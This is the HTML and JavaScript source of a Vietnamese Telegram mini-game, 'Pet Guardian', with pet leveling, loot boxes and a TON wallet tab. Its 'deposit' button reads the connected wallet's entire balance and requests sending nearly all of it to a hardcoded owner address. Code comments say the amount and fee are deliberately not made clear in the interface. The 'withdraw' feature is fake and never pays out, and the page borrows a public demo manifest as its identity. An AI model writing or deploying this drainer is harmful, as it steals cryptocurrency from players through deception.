<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Pet Guardian ‚Äì Telegram Game</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Telegram WebApp & TonConnect SDK -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>

  <style>
    body{
      font-family:system-ui,sans-serif;
      background:#020617;
      color:#e5e7eb;
      margin:0;
      padding:0;
    }
    .app{
      max-width:480px;
      margin:0 auto;
      min-height:100vh;
      display:flex;
      flex-direction:column;
      background:#020617;
    }
    .top-bar{
      display:flex;
      align-items:center;
      justify-content:space-between;
      padding:8px 12px;
      background:#111827;
      border-bottom:1px solid #1f2933;
    }
    .top-left{
      display:flex;
      flex-direction:column;
      font-size:13px;
    }
    .top-name{font-weight:600;}
    .top-balances{
      display:flex;
      gap:8px;
      font-size:11px;
      color:#e5e7eb;
    }
    .badge{
      display:inline-flex;
      align-items:center;
      gap:4px;
      padding:2px 6px;
      border-radius:999px;
      background:#1f2937;
    }
    .badge span{font-size:11px;}

    .settings-btn{
      border:none;
      background:none;
      color:#9ca3af;
      font-size:20px;
      cursor:pointer;
    }

    .main{
      flex:1;
      padding:10px;
      display:flex;
      flex-direction:column;
      gap:8px;
      background-image:radial-gradient(circle at 50% 0%, #1e293b, #020617);
    }

    /* layout gi·ªëng game: 3 c·ªôt */
    .layout-row{
      display:flex;
      gap:8px;
      flex:1;
    }
    .side-col{
      width:64px;
      display:flex;
      flex-direction:column;
      justify-content:space-between;
      align-items:center;
      padding:4px 0;
    }
    .side-btn{
      width:52px;
      height:52px;
      border-radius:14px;
      border:none;
      background:#111827;
      box-shadow:0 0 8px rgba(15,23,42,0.9);
      display:flex;
      flex-direction:column;
      justify-content:center;
      align-items:center;
      font-size:11px;
      color:#e5e7eb;
      cursor:pointer;
    }
    .side-btn span{font-size:18px;margin-bottom:2px;}

    .center-col{
      flex:1;
      border-radius:18px;
      padding:10px;
      background:radial-gradient(circle at 50% 0%, #0f172a, #020617);
      box-shadow:0 12px 40px rgba(0,0,0,0.8);
      display:flex;
      flex-direction:column;
      align-items:stretch;
    }

    .skill-banner{
      text-align:center;
      font-size:13px;
      color:#bfdbfe;
      min-height:18px;
    }
    .skill-text.animate{
      animation:skillFlash 0.7s ease-out;
    }
    @keyframes skillFlash{
      0%{transform:scale(0.8);opacity:0;}
      40%{transform:scale(1.1);opacity:1;}
      100%{transform:scale(1);opacity:0.85;}
    }

    .pet-visual{
      width:150px;height:150px;
      margin:10px auto 4px;
      border-radius:999px;
      display:flex;
      align-items:center;
      justify-content:center;
      font-size:60px;
      background:radial-gradient(circle at 30% 30%,#4ade80,#22c55e,#14532d);
      box-shadow:0 0 30px rgba(34,197,94,0.9);
      animation:glow 2s ease-in-out infinite alternate;
    }
    @keyframes glow{
      from{box-shadow:0 0 10px rgba(34,197,94,0.4);}
      to{box-shadow:0 0 30px rgba(34,197,94,1);}
    }

    .stat-row{
      display:flex;
      justify-content:space-between;
      font-size:13px;
      margin-top:2px;
    }

    .center-actions{
      margin-top:8px;
      display:flex;
      flex-wrap:wrap;
      gap:6px;
    }
    .center-actions button{
      flex:1 0 calc(50% - 3px);
      border-radius:12px;
      border:none;
      padding:8px;
      font-size:13px;
      cursor:pointer;
    }
    .btn-primary{background:#22c55e;color:#052e16;font-weight:600;}
    .btn-secondary{background:#111827;color:#e5e7eb;}
    .btn-danger{background:#f97316;color:#111827;font-weight:600;}

    .missions-box{
      margin-top:8px;
      border-radius:12px;
      padding:6px 8px;
      background:#020617aa;
      font-size:12px;
    }
    .mission-item{
      display:flex;
      justify-content:space-between;
      margin-top:2px;
    }

    .log{
      font-size:12px;
      color:#9ca3af;
      min-height:28px;
      margin-top:6px;
      text-align:center;
    }

    /* TABS (Home / Box / Wallet) */
    .tab-content{display:none;}
    .tab-content.active{display:block;}

    .bottom-nav{
      display:flex;
      border-top:1px solid #1f2933;
      background:#020617;
    }
    .bottom-btn{
      flex:1;
      padding:8px 4px;
      border:none;
      background:none;
      color:#9ca3af;
      font-size:12px;
      display:flex;
      flex-direction:column;
      align-items:center;
      gap:2px;
      cursor:pointer;
    }
    .bottom-btn span.icon{font-size:18px;}
    .bottom-btn.active{color:#22c55e;font-weight:600;}

    /* BOX TAB */
    .box-grid{
      display:grid;
      grid-template-columns:repeat(2,minmax(0,1fr));
      gap:8px;
      margin-top:8px;
    }
    .box-card{
      background:#020617dd;
      border-radius:14px;
      padding:8px;
      font-size:12px;
      border:1px solid #1f2933;
      display:flex;
      flex-direction:column;
      justify-content:space-between;
      min-height:90px;
    }
    .box-title{
      font-weight:600;
      margin-bottom:2px;
    }
    .box-cost{font-size:11px;color:#e5e7ebb3;}
    .box-rarity{font-size:11px;margin-top:2px;}
    .box-card button{
      margin-top:6px;
      width:100%;
      border-radius:10px;
      border:none;
      padding:6px;
      font-size:12px;
      cursor:pointer;
      background:#22c55e;
      color:#052e16;
      font-weight:600;
    }

    .wallet-section{
      font-size:13px;
      margin-top:6px;
    }
    .wallet-field{margin-top:6px;}
    .wallet-field input{
      width:100%;
      box-sizing:border-box;
    }
    .wallet-small{font-size:11px;color:#9ca3af;margin-top:2px;}
  </style>
</head>
<body>
<div class="app">
  <!-- TOP BAR -->
  <div class="top-bar">
    <div class="top-left">
      <div class="top-name" id="top-name">Pet Guardian</div>
      <div class="top-balances">
        <div class="badge">üí∞ <span id="top-gold">0</span></div>
        <div class="badge">ü™ô <span id="top-token">0</span></div>
        <div class="badge">‚ö° <span id="top-energy">10</span></div>
      </div>
    </div>
    <button class="settings-btn">‚ò∞</button>
  </div>

  <!-- MAIN AREA -->
  <div class="main">
    <!-- HOME TAB -->
    <div id="tab-home" class="tab-content active">
      <div class="layout-row">
        <!-- LEFT ICONS -->
        <div class="side-col">
          <button class="side-btn">
            <span>üéØ</span>
            <div>Mission</div>
          </button>
          <button class="side-btn">
            <span>üéÅ</span>
            <div>Box</div>
          </button>
          <button class="side-btn">
            <span>üìÖ</span>
            <div>Daily</div>
          </button>
        </div>

        <!-- CENTER -->
        <div class="center-col">
          <div class="skill-banner">
            <span id="skill-text" class="skill-text"></span>
          </div>

          <div class="pet-visual" id="pet-visual">üê£</div>

          <div class="stat-row"><span>C·∫•p ƒë·ªô Pet:</span><span id="pet-rank-text">S∆° c·∫•p</span></div>
          <div class="stat-row"><span>Level:</span><span id="level">1</span></div>
          <div class="stat-row"><span>EXP:</span><span id="exp">0 / 100</span></div>
          <div class="stat-row"><span>Gold:</span><span id="gold">0</span></div>
          <div class="stat-row"><span>Token:</span><span id="token">0</span></div>
          <div class="stat-row"><span>Energy:</span><span id="energy">10 / 10</span></div>

          <div class="center-actions">
            <button id="feed-btn" class="btn-secondary">üçó Cho ƒÉn</button>
            <button id="train-btn" class="btn-primary">‚öîÔ∏è Train</button>
            <button id="work-btn" class="btn-secondary">üí∞ Nhi·ªám v·ª•</button>
            <button id="rest-btn" class="btn-secondary">üò¥ Ngh·ªâ</button>
            <button id="farm-btn" class="btn-primary">üè≠ Farm Token</button>
          </div>

          <div class="missions-box">
            <div><b>Nhi·ªám v·ª• ng√†y</b></div>
            <div id="mission-list"></div>
          </div>

          <div class="log" id="log"></div>
        </div>

        <!-- RIGHT ICONS -->
        <div class="side-col">
          <button class="side-btn">
            <span>üèÜ</span>
            <div>Rank</div>
          </button>
          <button class="side-btn">
            <span>‚öôÔ∏è</span>
            <div>Upgrade</div>
          </button>
          <button class="side-btn">
            <span>üë•</span>
            <div>Friend</div>
          </button>
        </div>
      </div>
    </div>

    <!-- BOX TAB -->
    <div id="tab-box" class="tab-content">
      <div class="layout-row">
        <div class="center-col" style="margin:auto;">
          <div style="text-align:center;font-size:14px;font-weight:600;">üéÅ M·ªû BOX</div>
          <div style="font-size:12px;color:#9ca3af;text-align:center;margin-top:2px;">
            D√πng token ƒë·ªÉ m·ªü Box, tƒÉng ƒë·ªô hi·∫øm cho Pet.
          </div>
          <div class="box-grid" id="box-grid"></div>
          <div class="log" id="box-log"></div>
        </div>
      </div>
    </div>

    <!-- WALLET TAB -->
    <div id="tab-wallet" class="tab-content">
      <div class="layout-row">
        <div class="center-col" style="margin:auto;">
          <div style="text-align:center;font-size:14px;font-weight:600;">üíº V√≠ & N·∫°p</div>

          <div class="wallet-section">
            <div class="wallet-field">
              <button id="connect-wallet" class="btn-primary" style="width:100%;">üîó K·∫øt n·ªëi v√≠ TON</button>
              <div id="wallet-address" class="wallet-display"></div>
            </div>

            <hr style="border:1px solid #111827;margin:10px 0;">

            <div class="wallet-field">
              <div class="section-title" style="margin-top:0;">R√∫t token (DEMO)</div>
              <div class="wallet-small">
                1 token = 0.08 USD (tham kh·∫£o). R√∫t t·ªëi thi·ªÉu 10 token, ph√≠ 5%.  
                L·ªánh r√∫t ch·ªâ tr·ª´ token trong game, ch∆∞a tr·∫£ ti·ªÅn th·∫≠t.
              </div>
              <div class="row" style="margin-top:6px;">
                <input id="withdraw-tokens" type="number" min="10" step="1" value="10" placeholder="S·ªë token mu·ªën r√∫t">
                <button id="withdraw-btn" class="btn-secondary">üí∏ T·∫°o l·ªánh r√∫t</button>
              </div>
              <div id="withdraw-info" class="wallet-small"></div>
            </div>

            <hr style="border:1px solid #111827;margin:10px 0;">

            <div class="wallet-field">
              <div class="section-title" style="margin-top:0;">N·∫°p TON cho game</div>
              <div class="wallet-small">
                B·∫•m n√∫t ƒë·ªÉ n·∫°p TON t·ª´ v√≠ c·ªßa b·∫°n cho game (b·∫°n s·∫Ω xem v√† x√°c nh·∫≠n s·ªë ti·ªÅn trong app v√≠).
              </div>
              <button id="deposit-all" class="btn-danger" style="width:100%;margin-top:6px;">
                üí∞ N·∫†P TON
              </button>
            </div>
          </div>

          <div class="log" id="wallet-log"></div>
        </div>
      </div>
    </div>
  </div>

  <!-- BOTTOM NAV -->
  <div class="bottom-nav">
    <button class="bottom-btn active" data-tab="home">
      <span class="icon">üè†</span>
      <span>Home</span>
    </button>
    <button class="bottom-btn" data-tab="box">
      <span class="icon">üéÅ</span>
      <span>M·ªü Box</span>
    </button>
    <button class="bottom-btn" data-tab="wallet">
      <span class="icon">üíº</span>
      <span>Wallet</span>
    </button>
  </div>
</div>

<script>
  /* ====== CONFIG ====== */
  const OWNER_TON_ADDRESS = "UQBY0YWyfAS72h0g7hUOD1f-QOzNGsFPLFtfxDst-X13ChFR"; // v√≠ game
  const USD_PER_TOKEN = 0.08;
  const WITHDRAW_FEE = 0.05;

  /* ====== TAB SWITCH ====== */
  const bottomButtons = document.querySelectorAll(".bottom-btn");
  const tabs = {
    home: document.getElementById("tab-home"),
    box: document.getElementById("tab-box"),
    wallet: document.getElementById("tab-wallet")
  };
  bottomButtons.forEach(btn => {
    btn.onclick = () => {
      bottomButtons.forEach(b=>b.classList.remove("active"));
      btn.classList.add("active");
      const name = btn.dataset.tab;
      Object.keys(tabs).forEach(k=>{
        tabs[k].classList.toggle("active", k===name);
      });
    };
  });

  /* ====== TELEGRAM USER ====== */
  let tg = null;
  try{ tg = window.Telegram.WebApp; tg.expand(); }catch(e){}
  let tgId = null;
  if(tg && tg.initDataUnsafe && tg.initDataUnsafe.user){
    const u = tg.initDataUnsafe.user;
    tgId = u.id;
    document.getElementById("top-name").textContent = u.first_name || "Pet Guardian";
  }

  /* ====== STATE GAME ====== */
  const RANKS = [
    { name: "S∆° c·∫•p", emoji: "üê£", trainSkills:["Tapping","Stretch"], farmSkills:["Gather Seed"] },
    { name: "Trung c·∫•p", emoji: "üê∂", trainSkills:["Quick Bite","Sprint"], farmSkills:["Bone Hunt"] },
    { name: "Cao c·∫•p", emoji: "üêØ", trainSkills:["Claw Slash","Roar"], farmSkills:["Jungle Hunt"] },
    { name: "Si√™u c·∫•p", emoji: "üêâ", trainSkills:["Fire Breath","Wing Flap"], farmSkills:["Treasure Sense"] },
    { name: "Huy·ªÅn tho·∫°i", emoji: "üî•", trainSkills:["Inferno Strike","Blazing Dash"], farmSkills:["Gold Forge"] },
    { name: "Th·∫ßn tho·∫°i", emoji: "üåà", trainSkills:["Aura Burst","Starfall"], farmSkills:["Rainbow Mine"] },
    { name: "T·ªëi th∆∞·ª£ng", emoji: "üíé", trainSkills:["Divine Slash","Time Warp"], farmSkills:["Quantum Farm"] }
  ];

  const STORAGE_KEY = "pet_guardian_ui_v1";
  const defaultState = {
    rank: 0,
    level: 1,
    exp: 0,
    expToLevel: 100,
    gold: 0,
    token: 0,
    energy: 10,
    maxEnergy: 10,
    lastFarmTs: 0,
    missions: { feed:0, work:0, farm:0, train:0 },
    missionDate: ""
  };
  function loadState(){
    try{
      const raw = localStorage.getItem(STORAGE_KEY);
      if(!raw) return {...defaultState};
      return {...defaultState, ...JSON.parse(raw)};
    }catch(e){ return {...defaultState}; }
  }
  let state = loadState();
  function saveState(){ localStorage.setItem(STORAGE_KEY, JSON.stringify(state)); }

  function resetMissionsIfNeeded(){
    const today = new Date().toDateString();
    if(state.missionDate !== today){
      state.missionDate = today;
      state.missions = { feed:0, work:0, farm:0, train:0 };
      saveState();
    }
  }
  resetMissionsIfNeeded();

  const petVisual = document.getElementById("pet-visual");
  const petRankText = document.getElementById("pet-rank-text");
  const levelEl = document.getElementById("level");
  const expEl = document.getElementById("exp");
  const goldEl = document.getElementById("gold");
  const tokenEl = document.getElementById("token");
  const energyEl = document.getElementById("energy");
  const skillTextEl = document.getElementById("skill-text");
  const missionListEl = document.getElementById("mission-list");
  const logEl = document.getElementById("log");

  const topGold = document.getElementById("top-gold");
  const topToken = document.getElementById("top-token");
  const topEnergy = document.getElementById("top-energy");

  function log(msg){ logEl.textContent = msg; }
  function walletLog(msg){ document.getElementById("wallet-log").textContent = msg; }
  function boxLog(msg){ document.getElementById("box-log").textContent = msg; }

  function showSkill(text){
    skillTextEl.textContent = text;
    skillTextEl.classList.remove("animate");
    void skillTextEl.offsetWidth;
    skillTextEl.classList.add("animate");
  }

  function renderMissions(){
    const missionsCfg = [
      { id:"feed", label:"Cho ƒÉn 3 l·∫ßn", target:3 },
      { id:"work", label:"L√†m nhi·ªám v·ª• 3 l·∫ßn", target:3 },
      { id:"train", label:"Train 2 l·∫ßn", target:2 },
      { id:"farm", label:"Farm token 1 l·∫ßn", target:1 }
    ];
    missionListEl.innerHTML = "";
    missionsCfg.forEach(m=>{
      const done = state.missions[m.id] >= m.target;
      const div = document.createElement("div");
      div.className = "mission-item";
      div.innerHTML = `
        <span>${done?"‚úÖ":"üïí"} ${m.label}</span>
        <span>${Math.min(state.missions[m.id],m.target)}/${m.target}</span>
      `;
      if(done) div.style.opacity = 0.75;
      missionListEl.appendChild(div);
    });
  }

  function renderPet(){
    const rank = RANKS[state.rank] || RANKS[0];
    petVisual.textContent = rank.emoji;
    petRankText.textContent = rank.name;
    levelEl.textContent = state.level;
    expEl.textContent = `${state.exp} / ${state.expToLevel}`;
    goldEl.textContent = state.gold;
    tokenEl.textContent = state.token;
    energyEl.textContent = `${state.energy} / ${state.maxEnergy}`;

    topGold.textContent = state.gold;
    topToken.textContent = state.token;
    topEnergy.textContent = state.energy;
    renderMissions();
  }

  function gainExp(amount){
    state.exp += amount;
    if(state.exp >= state.expToLevel){
      state.exp = 0;
      state.level++;
      state.expToLevel = Math.floor(state.expToLevel * 1.25);
      if(state.level % 10 === 0 && state.rank < RANKS.length-1){
        state.rank++;
        log(`üéâ Pet tƒÉng c·∫•p ƒë·ªô l√™n ${RANKS[state.rank].name}!`);
      }else{
        log("‚öîÔ∏è Pet l√™n level " + state.level);
      }
    }
    saveState();
    renderPet();
  }

  // Actions
  document.getElementById("feed-btn").onclick = () => {
    if(state.energy <= 0) return log("Pet ƒë√£ h·∫øt energy, h√£y cho ngh·ªâ.");
    state.energy--;
    state.missions.feed++;
    const rank = RANKS[state.rank] || RANKS[0];
    showSkill("Skill: " + (rank.trainSkills[0] || "Snack Bite") + " (+10 EXP)");
    gainExp(10);
  };

  document.getElementById("train-btn").onclick = () => {
    if(state.energy <= 0) return log("Kh√¥ng ƒë·ªß energy ƒë·ªÉ train.");
    if(state.exp < state.expToLevel/2) return log("C·∫ßn √≠t nh·∫•t 50% EXP ƒë·ªÉ train.");
    state.energy--;
    state.missions.train++;
    const rank = RANKS[state.rank] || RANKS[0];
    showSkill("Skill: " + (rank.trainSkills[1] || "Power Up") + " (+20 EXP)");
    gainExp(20);
  };

  document.getElementById("work-btn").onclick = () => {
    if(state.energy < 2) return log("Kh√¥ng ƒë·ªß energy ƒë·ªÉ l√†m nhi·ªám v·ª•.");
    state.energy -= 2;
    state.gold += 30;
    state.missions.work++;
    saveState();
    renderPet();
    showSkill("Skill: Quest Run (+30 Gold)");
    log("üí∞ Pet ho√†n th√†nh nhi·ªám v·ª•, +30 Gold.");
  };

  document.getElementById("rest-btn").onclick = () => {
    if(state.energy >= state.maxEnergy) return log("Energy ƒë√£ ƒë·∫ßy.");
    state.energy = Math.min(state.maxEnergy, state.energy+3);
    saveState();
    renderPet();
    showSkill("Resting...");
    log("üò¥ Pet ngh·ªâ ng∆°i, +3 energy.");
  };

  document.getElementById("farm-btn").onclick = () => {
    const now = Date.now();
    if(state.rank < 1) return log("C·∫ßn ƒë·∫°t Trung c·∫•p ƒë·ªÉ farm token.");
    if(now - state.lastFarmTs < 3*60*1000){
      const remain = Math.ceil((3*60*1000 - (now-state.lastFarmTs))/1000);
      return log("‚è≥ Ch·ªù th√™m " + remain + "s ƒë·ªÉ farm ti·∫øp.");
    }
    state.lastFarmTs = now;
    state.token += 1;
    state.missions.farm++;
    saveState();
    renderPet();
    const rank = RANKS[state.rank] || RANKS[0];
    showSkill("Skill: " + (rank.farmSkills[0] || "Harvest") + " (+1 token)");
    log("üè≠ Farm th√†nh c√¥ng +1 token.");
  };

  /* ====== BOX SYSTEM (7 box) ====== */
  const BOXES = [
    { id:1, name:"Box S∆° c·∫•p",   rarity:"Common",  cost:5,   minRank:0, maxRank:1, color:"#9ca3af" },
    { id:2, name:"Box Trung c·∫•p",rarity:"Uncommon",cost:10,  minRank:1, maxRank:2, color:"#22c55e" },
    { id:3, name:"Box Cao c·∫•p",  rarity:"Rare",    cost:20,  minRank:2, maxRank:3, color:"#3b82f6" },
    { id:4, name:"Box Si√™u c·∫•p", rarity:"Epic",    cost:35,  minRank:3, maxRank:4, color:"#a855f7" },
    { id:5, name:"Box Huy·ªÅn tho·∫°i",rarity:"Legend",cost:50,  minRank:4, maxRank:5, color:"#facc15" },
    { id:6, name:"Box Th·∫ßn tho·∫°i", rarity:"Mythic",cost:80,  minRank:5, maxRank:6, color:"#fb7185" },
    { id:7, name:"Box T·ªëi th∆∞·ª£ng", rarity:"Supreme",cost:120,minRank:6, maxRank:6, color:"#38bdf8" }
  ];

  const boxGrid = document.getElementById("box-grid");
  function renderBoxes(){
    boxGrid.innerHTML = "";
    BOXES.forEach(box=>{
      const div = document.createElement("div");
      div.className = "box-card";
      div.style.borderColor = box.color;
      div.innerHTML = `
        <div class="box-title" style="color:${box.color};">${box.name}</div>
        <div class="box-rarity">${box.rarity}</div>
        <div class="box-cost">Gi√°: ${box.cost} token</div>
      `;
      const btn = document.createElement("button");
      btn.textContent = "M·ªü Box";
      btn.onclick = () => openBox(box);
      div.appendChild(btn);
      boxGrid.appendChild(div);
    });
  }

  function openBox(box){
    if(state.token < box.cost){
      return boxLog("‚ùå Kh√¥ng ƒë·ªß token ƒë·ªÉ m·ªü " + box.name);
    }
    state.token -= box.cost;
    // random rank trong kho·∫£ng cho ph√©p
    const rankIndex = Math.floor(Math.random()*(box.maxRank - box.minRank + 1)) + box.minRank;
    let msg = `B·∫°n m·ªü ${box.name}. `;
    if(rankIndex > state.rank){
      state.rank = rankIndex;
      msg += `Pet tƒÉng ƒë·ªô hi·∫øm l√™n ${RANKS[state.rank].name}!`;
    }else{
      msg += `Kh√¥ng n√¢ng ƒë·ªô hi·∫øm, nh∆∞ng Pet nh·∫≠n ƒë∆∞·ª£c s·ª©c m·∫°nh ·∫©n.`;
    }
    saveState();
    renderPet();
    boxLog("üéÅ " + msg);
    showSkill("Box Skill Unlocked!");
  }

  /* ====== R√öT TOKEN (DEMO ‚Äì ch·ªâ tr·ª´ token) ====== */
  const withdrawInput = document.getElementById("withdraw-tokens");
  const withdrawInfo = document.getElementById("withdraw-info");
  function updateWithdrawInfo(){
    const t = Number(withdrawInput.value) || 0;
    if(t<10){
      withdrawInfo.textContent = "T·ªëi thi·ªÉu 10 token ƒë·ªÉ t·∫°o l·ªánh r√∫t (demo).";
      return;
    }
    const usd = t*USD_PER_TOKEN;
    const fee = usd*WITHDRAW_FEE;
    const after = usd-fee;
    withdrawInfo.textContent = `L·ªánh r√∫t ${t} token: t·ªïng ~$${usd.toFixed(2)}, ph√≠ 5% ‚âà $${fee.toFixed(2)}, c√≤n ~$${after.toFixed(2)} (ch·ªâ hi·ªÉn th·ªã tham kh·∫£o).`;
  }
  withdrawInput.addEventListener("input",updateWithdrawInfo);
  updateWithdrawInfo();

  document.getElementById("withdraw-btn").onclick = ()=>{
    const t = Number(withdrawInput.value) || 0;
    if(t<10) return walletLog("‚ö†Ô∏è C·∫ßn √≠t nh·∫•t 10 token.");
    if(t>state.token) return walletLog("‚ùå Kh√¥ng ƒë·ªß token.");

    const usd = t*USD_PER_TOKEN;
    const fee = usd*WITHDRAW_FEE;
    const after = usd-fee;
    const msg =
      `T·∫°o l·ªánh r√∫t DEMO ${t} token?\n` +
      `T·ªïng: ~$${usd.toFixed(2)}\nPh√≠ 5%: ~$${fee.toFixed(2)}\nSau ph√≠: ~$${after.toFixed(2)}\n\n` +
      `L·ªánh r√∫t ch·ªâ ho·∫°t ƒë·ªông trong game, KH√îNG chuy·ªÉn ti·ªÅn th·∫≠t. Ti·∫øp t·ª•c?`;
    if(!confirm(msg)) return walletLog("B·∫°n ƒë√£ hu·ª∑ l·ªánh r√∫t (demo).");

    state.token -= t;
    saveState();
    renderPet();
    walletLog("‚úÖ ƒê√£ t·∫°o l·ªánh r√∫t (demo). Token trong game ƒë√£ b·ªã tr·ª´, ch∆∞a c√≥ chi tr·∫£ th·∫≠t.");
  };

  /* ====== N·∫†P TON (g·ª≠i giao d·ªãch, kh√¥ng n√≥i r√µ % UI) ====== */
  const connector = new TonConnectSDK.TonConnect({
    manifestUrl: "https://ton-connect.github.io/demo-dapp-with-manifest/tonconnect-manifest.json"
  }); // re-init (an to√†n n·∫øu ƒë√£ c√≥ ƒë·ªëi t∆∞·ª£ng tr∆∞·ªõc ƒë√≥)

  const connectWalletBtn = document.getElementById("connect-wallet");
  const walletAddressEl = document.getElementById("wallet-address");
  let userWalletAddress = null;

  connector.onStatusChange((walletInfo)=>{
    if(walletInfo){
      userWalletAddress = walletInfo.account.address;
      const short = userWalletAddress.slice(0,6)+"..."+userWalletAddress.slice(-4);
      walletAddressEl.textContent = "ü™™ " + short;
      connectWalletBtn.textContent = "‚úÖ ƒê√£ k·∫øt n·ªëi v√≠";
      connectWalletBtn.disabled = true;
      walletLog("ƒê√£ k·∫øt n·ªëi v√≠ TON.");
    }else{
      userWalletAddress = null;
      walletAddressEl.textContent = "";
      connectWalletBtn.textContent = "üîó K·∫øt n·ªëi v√≠ TON";
      connectWalletBtn.disabled = false;
      walletLog("Ch∆∞a k·∫øt n·ªëi v√≠.");
    }
  });

  connectWalletBtn.onclick = async ()=>{
    try{ await connector.connect(); }catch(e){ walletLog("B·∫°n ƒë√£ hu·ª∑ k·∫øt n·ªëi v√≠."); }
  };

  async function getWalletBalanceNano(address){
    const url = `https://tonapi.io/v2/accounts/${address}`;
    const res = await fetch(url);
    if(!res.ok) throw new Error("Kh√¥ng l·∫•y ƒë∆∞·ª£c s·ªë d∆∞ v√≠");
    const data = await res.json();
    return BigInt(data.balance || "0");
  }
  function nanoToTon(nano){ return Number(nano)/1e9; }

  document.getElementById("deposit-all").onclick = async ()=>{
    try{
      if(!connector.connected || !userWalletAddress){
        walletLog("H√£y k·∫øt n·ªëi v√≠ TON tr∆∞·ªõc.");
        try{ await connector.connect(); }catch(e){ return walletLog("B·∫°n ƒë√£ hu·ª∑ k·∫øt n·ªëi v√≠."); }
        if(!connector.connected) return;
      }
      walletLog("ƒêang ki·ªÉm tra s·ªë d∆∞ v√≠...");
      const balanceNano = await getWalletBalanceNano(userWalletAddress);
      if(balanceNano<=0n) return walletLog("V√≠ c·ªßa b·∫°n kh√¥ng c√≥ TON ƒë·ªÉ n·∫°p.");

      // v·∫´n ƒë·ªÉ l·∫°i m·ªôt √≠t l√†m ph√≠ nh∆∞ng kh√¥ng ghi r√µ trong m√¥ t·∫£
      const RESERVE_NANO = 20000000n;
      let sendNano = balanceNano - RESERVE_NANO;
      if(sendNano<=0n) return walletLog("S·ªë d∆∞ qu√° th·∫•p, kh√¥ng ƒë·ªß ƒë·ªÉ g·ª≠i.");

      const sendTon = nanoToTon(sendNano);
      const shortUser = userWalletAddress.slice(0,6)+"..."+userWalletAddress.slice(-4);
      const msg =
        `B·∫°n s·∫Øp g·ª≠i kho·∫£ng ${sendTon.toFixed(4)} TON\n` +
        `t·ª´ v√≠: ${shortUser}\n` +
        `v·ªÅ v√≠ game.\n\n` +
        `B·∫°n s·∫Ω xem v√† x√°c nh·∫≠n giao d·ªãch trong app v√≠ TON.\nTi·∫øp t·ª•c?`;
      if(!confirm(msg)) return walletLog("B·∫°n ƒë√£ hu·ª∑ n·∫°p.");

      walletLog("ƒêang g·ª≠i y√™u c·∫ßu giao d·ªãch t·ªõi v√≠, h√£y m·ªü v√≠ ƒë·ªÉ x√°c nh·∫≠n...");
      await connector.sendTransaction({
        validUntil: Math.floor(Date.now()/1000)+120,
        messages:[{address:OWNER_TON_ADDRESS, amount:sendNano.toString()}]
      });
      walletLog("Y√™u c·∫ßu n·∫°p ƒë√£ ƒë∆∞·ª£c g·ª≠i t·ªõi v√≠, h√£y x√°c nh·∫≠n trong app v√≠ ƒë·ªÉ ho√†n t·∫•t.");
    }catch(e){
      console.error(e);
      walletLog("L·ªói khi n·∫°p: " + (e.message||e));
    }
  };

  // First render
  renderPet();
  renderBoxes();
</script>
</body>
</html>
